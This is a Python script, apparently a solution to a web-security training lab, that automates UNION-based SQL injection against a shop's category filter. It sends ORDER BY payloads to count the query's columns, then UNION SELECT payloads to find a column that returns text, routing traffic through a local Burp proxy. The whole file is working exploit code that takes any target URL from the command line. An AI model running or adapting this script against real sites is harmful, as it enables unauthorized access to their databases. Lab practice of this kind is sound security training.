# Import necessary libraries
import requests  # For making HTTP requests
import sys  # For handling command-line arguments
import urllib3  # For disabling SSL/TLS warnings

# Disable SSL/TLS warnings about insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define proxy settings (used for intercepting and analyzing network traffic through BURPsuite)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Function to determine the number of columns in a SQL injection vulnerability
def exploit_sqli_column_number(url):
    path = "/filter?category=Gifts"
    for i in range(1, 50):
        # Generate SQL payload for ordering by column number
        sql_payload = "'+order+by+%s--" % i
        # Send a GET request with the SQL payload
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        # Check if the response contains "Internal Server Error," indicating an invalid column
        if "Internal Server Error" in res:
            return i - 1  # Return the actual column count (subtract 1 because of 0-indexing)
    return False  # SQL injection attack not successful, return False

# Function to determine which column contains text data in a SQL injection vulnerability
def exploit_sqli_string_field(url, num_col):
    path = "filter?category=Gifts"
    for i in range(1, num_col + 1):
        string = "'v2F6UA'"  # String payload for identifying the text column
        payload_list = ['null'] * num_col
        payload_list[i - 1] = string
        # Generate SQL payload for union select with specified text column
        sql_payload = "' union select " + ','.join(payload_list) + "--"
        # Send a GET request with the SQL payload
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        # Check if the response contains the specified string, indicating the correct text column
        if string.strip('\'') in res:
            return i  # Return the column index that contains text
    return False  # No suitable column with text data found, return False

# Main program execution block
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()  # Get target URL from command-line arguments
    except IndexError:
        # Print usage instructions and exit if the argument is missing
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    # Step 1: Determine the number of columns using SQL injection
    print("[+] Figuring out the number of columns...")
    num_col = exploit_sqli_column_number(url)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + ".")
        
        # Step 2: Determine which column contains text data using SQL injection
        print("[+] Figuring out which column contains text...")
        string_column = exploit_sqli_string_field(url, num_col)
        if string_column:
            print("[+] The column that contains text is " + str(string_column) + ".")
        else:
            print("[-] We were not able to find a column that has a string data type.")
    else:
        print("[-] The SQLi attack was not successful.")